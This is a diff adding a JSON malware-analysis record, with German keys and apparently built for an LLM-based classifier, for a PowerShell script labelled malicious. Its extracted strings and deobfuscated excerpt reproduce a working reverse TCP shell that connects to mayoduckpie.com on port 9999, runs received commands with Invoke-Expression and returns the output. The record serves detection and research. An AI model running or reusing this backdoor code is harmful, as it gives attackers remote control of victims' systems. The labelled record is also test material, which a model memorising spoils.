@@ -1,0 +1,121 @@
+{
+  "meta": {
+    "quelldatei": "07f375cb53ca2275e741e46a0b58739ac1c4a6862f9afded3315a26cb256e584.ps1",
+    "sha256": "07f375cb53ca2275e741e46a0b58739ac1c4a6862f9afded3315a26cb256e584",
+    "groesse_bytes": 2778,
+    "zeilen": 82,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "########################################################################",
+      "#                                                                      #",
+      "#                        PowerShell Reverse TCP v3.6                   #",
+      "#                                          by Ivan Sincek              #",
+      "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #",
+      "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #",
+      "mayoduckpie.com",
+      "Backdoor is up and running...",
+      ";\r\n\t$bytes = 0;\r\n\tdo {\r\n\t\t$writer.Write(",
+      ");\r\n\t\tdo {\r\n\t\t\t$bytes = $stream.Read($buffer, 0, $buffer.Length);\r\n\t\t\tif ($bytes -gt 0) {\r\n\t\t\t\t$data = $data + $encoding.GetString($buffer, 0, $bytes);\r\n\t\t\t}\r\n\t\t} while ($stream.DataAvailable);\r\n\t\tif ($bytes -gt 0) {\r\n\t\t\t$data = $data.Trim();\r\n\t\t\tif ($data.Length -gt 0) {\r\n\t\t\t\ttry {\r\n\t\t\t\t\t$result = Invoke-Expression -Command $data 2>&1 | Out-String;\r\n\t\t\t\t} catch {\r\n\t\t\t\t\t$result = $_.Exception | Out-String;\r\n\t\t\t\t}\r\n\t\t\t\tClear-Variable -Name ",
+      ";\r\n\t\t\t\t$length = $result.Length;\r\n\t\t\t\t$count = 0;\r\n\t\t\t\t$bytes = $buffer.Length;\r\n\t\t\t\twhile ($length -gt 0) {\r\n\t\t\t\t\tif ($length -lt $buffer.Length) {\r\n\t\t\t\t\t\t$bytes = $length;\r\n\t\t\t\t\t}\r\n\t\t\t\t\t$writer.Write($result.substring($count, $bytes));\r\n\t\t\t\t\t$count += $bytes;\r\n\t\t\t\t\t$length -= $bytes;\r\n\t\t\t\t}\r\n\t\t\t\tClear-Variable -Name ",
+      ";\r\n\t\t\t}\r\n\t\t}\r\n\t} while ($bytes -gt 0);\r\n\tWrite-Host ",
+      ";\r\n} catch {\r\n\tWrite-Host $_.Exception.InnerException.Message;\r\n} finally {\r\n\tif ($writer -ne $null) {\r\n\t\t$writer.Close(); $writer.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($stream -ne $null) {\r\n\t\t$stream.Close(); $stream.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($client -ne $null) {\r\n\t\t$client.Close(); $client.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($buffer -ne $null) {\r\n\t\t$buffer.Clear();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($result -ne $null) {\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($data -ne $null) {\r\n\t\tClear-Variable -Name "
+    ],
+    "string_anzahl_gesamt": 21,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "########################################################################",
+      "#                                                                      #",
+      "#                        PowerShell Reverse TCP v3.6                   #",
+      "#                                          by Ivan Sincek              #",
+      "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #",
+      "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #",
+      "mayoduckpie.com",
+      "Backdoor is up and running...",
+      ";\r\n\t$bytes = 0;\r\n\tdo {\r\n\t\t$writer.Write(",
+      ");\r\n\t\tdo {\r\n\t\t\t$bytes = $stream.Read($buffer, 0, $buffer.Length);\r\n\t\t\tif ($bytes -gt 0) {\r\n\t\t\t\t$data = $data + $encoding.GetString($buffer, 0, $bytes);\r\n\t\t\t}\r\n\t\t} while ($stream.DataAvailable);\r\n\t\tif ($bytes -gt 0) {\r\n\t\t\t$data = $data.Trim();\r\n\t\t\tif ($data.Length -gt 0) {\r\n\t\t\t\ttry {\r\n\t\t\t\t\t$result = Invoke-Expression -Command $data 2>&1 | Out-String;\r\n\t\t\t\t} catch {\r\n\t\t\t\t\t$result = $_.Exception | Out-String;\r\n\t\t\t\t}\r\n\t\t\t\tClear-Variable -Name ",
+      ";\r\n\t\t\t\t$length = $result.Length;\r\n\t\t\t\t$count = 0;\r\n\t\t\t\t$bytes = $buffer.Length;\r\n\t\t\t\twhile ($length -gt 0) {\r\n\t\t\t\t\tif ($length -lt $buffer.Length) {\r\n\t\t\t\t\t\t$bytes = $length;\r\n\t\t\t\t\t}\r\n\t\t\t\t\t$writer.Write($result.substring($count, $bytes));\r\n\t\t\t\t\t$count += $bytes;\r\n\t\t\t\t\t$length -= $bytes;\r\n\t\t\t\t}\r\n\t\t\t\tClear-Variable -Name ",
+      ";\r\n\t\t\t}\r\n\t\t}\r\n\t} while ($bytes -gt 0);\r\n\tWrite-Host ",
+      ";\r\n} catch {\r\n\tWrite-Host $_.Exception.InnerException.Message;\r\n} finally {\r\n\tif ($writer -ne $null) {\r\n\t\t$writer.Close(); $writer.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($stream -ne $null) {\r\n\t\t$stream.Close(); $stream.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($client -ne $null) {\r\n\t\t$client.Close(); $client.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($buffer -ne $null) {\r\n\t\t$buffer.Clear();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($result -ne $null) {\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($data -ne $null) {\r\n\t\tClear-Variable -Name "
+    ],
+    "string_anzahl_gesamt": 21,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Clear-Variable",
+      "Invoke-Expression",
+      "New-Object",
+      "Out-String",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "########################################################################",
+      "#                                                                      #",
+      "#                        PowerShell Reverse TCP v3.6                   #",
+      "#                                          by Ivan Sincek              #",
+      "# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #",
+      "# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #",
+      "mayoduckpie.com",
+      "Backdoor is up and running...",
+      ";\r\n\t$bytes = 0;\r\n\tdo {\r\n\t\t$writer.Write(",
+      ");\r\n\t\tdo {\r\n\t\t\t$bytes = $stream.Read($buffer, 0, $buffer.Length);\r\n\t\t\tif ($bytes -gt 0) {\r\n\t\t\t\t$data = $data + $encoding.GetString($buffer, 0, $bytes);\r\n\t\t\t}\r\n\t\t} while ($stream.DataAvailable);\r\n\t\tif ($bytes -gt 0) {\r\n\t\t\t$data = $data.Trim();\r\n\t\t\tif ($data.Length -gt 0) {\r\n\t\t\t\ttry {\r\n\t\t\t\t\t$result = Invoke-Expression -Command $data 2>&1 | Out-String;\r\n\t\t\t\t} catch {\r\n\t\t\t\t\t$result = $_.Exception | Out-String;\r\n\t\t\t\t}\r\n\t\t\t\tClear-Variable -Name ",
+      ";\r\n\t\t\t\t$length = $result.Length;\r\n\t\t\t\t$count = 0;\r\n\t\t\t\t$bytes = $buffer.Length;\r\n\t\t\t\twhile ($length -gt 0) {\r\n\t\t\t\t\tif ($length -lt $buffer.Length) {\r\n\t\t\t\t\t\t$bytes = $length;\r\n\t\t\t\t\t}\r\n\t\t\t\t\t$writer.Write($result.substring($count, $bytes));\r\n\t\t\t\t\t$count += $bytes;\r\n\t\t\t\t\t$length -= $bytes;\r\n\t\t\t\t}\r\n\t\t\t\tClear-Variable -Name ",
+      ";\r\n\t\t\t}\r\n\t\t}\r\n\t} while ($bytes -gt 0);\r\n\tWrite-Host ",
+      ";\r\n} catch {\r\n\tWrite-Host $_.Exception.InnerException.Message;\r\n} finally {\r\n\tif ($writer -ne $null) {\r\n\t\t$writer.Close(); $writer.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($stream -ne $null) {\r\n\t\t$stream.Close(); $stream.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($client -ne $null) {\r\n\t\t$client.Close(); $client.Dispose();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($buffer -ne $null) {\r\n\t\t$buffer.Clear();\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($result -ne $null) {\r\n\t\tClear-Variable -Name ",
+      ";\r\n\t}\r\n\tif ($data -ne $null) {\r\n\t\tClear-Variable -Name "
+    ],
+    "string_anzahl_gesamt": 21,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Clear-Variable",
+      "Invoke-Expression",
+      "New-Object",
+      "Out-String",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "invoke_expression": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": []
+    },
+    "deobfuskiert_auszug": "Write-Host \"########################################################################\";\r\nWrite-Host \"#                                                                      #\";\r\nWrite-Host \"#                        PowerShell Reverse TCP v3.6                   #\";\r\nWrite-Host \"#                                          by Ivan Sincek              #\";\r\nWrite-Host \"#                                                                      #\";\r\nWrite-Host \"# GitHub repository at github.com/ivan-sincek/powershell-reverse-tcp.  #\";\r\nWrite-Host \"# Feel free to donate bitcoin at 1BrZM6T7G9RN8vbabnfXu4M6Lpgztq6Y14.   #\";\r\nWrite-Host \"#                                                                      #\";\r\nWrite-Host \"########################################################################\";\r\n$client = $stream = $buffer = $writer = $data = $result = $null;\r\ntry {\r\n\t# change the host address and/or port number as necessary\r\n\t$client = New-Object Net.Sockets.TcpClient(\"mayoduckpie.com\", 9999);\r\n\t$stream = $client.GetStream();\r\n\t$buffer = New-Object Byte[] 1024;\r\n\t$encoding = New-Object Text.AsciiEncoding;\r\n\t$writer = New-Object IO.StreamWriter($stream);\r\n\t$writer.AutoFlush = $true;\r\n\tWrite-Host \"Backdoor is up and running...\";\r\n\tWrite-Host \"\";\r\n\t$bytes = 0;\r\n\tdo {\r\n\t\t$writer.Write(\"PS>\");\r\n\t\tdo {\r\n\t\t\t$bytes = $stream.Read($buffer, 0, $buffer.Length);\r\n\t\t\tif ($bytes -gt 0) {\r\n\t\t\t\t$data = $data + $encoding.GetString($buffer, 0, $bytes);\r\n\t\t\t}\r\n\t\t} while ($stream.DataAvailable);\r\n\t\tif ($bytes -gt 0) {\r\n\t\t\t$data = $data.Trim();\r\n\t\t\tif ($data.Length -gt 0) {\r\n\t\t\t\ttry {\r\n\t\t\t\t\t$result = Invoke-Expression -Command $data 2>&1 | Out-String;\r\n\t\t\t\t} catch {\r\n\t\t\t\t\t$result = $_.Exception | Out-String;\r\n\t\t\t\t}\r\n\t\t\t\tClear-Variable -Name \"data\";\r\n\t\t\t\t$length = $result.Length;\r\n\t\t\t\t$count = 0;\r\n\t\t\t\t$bytes = $buffer.Length;\r\n\t\t\t\twhile ($length -gt 0) {\r\n\t\t\t\t\tif ($length -lt $buffer.Length) {\r\n\t\t\t\t\t\t$bytes = $length;\r\n\t\t\t\t\t}\r\n\t\t\t\t\t$writer.Write($result.substring($count, $bytes));\r\n\t\t\t\t\t$count += $byt",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Zeichenkette als Code ausfuehren"
+    ]
+  }
+}
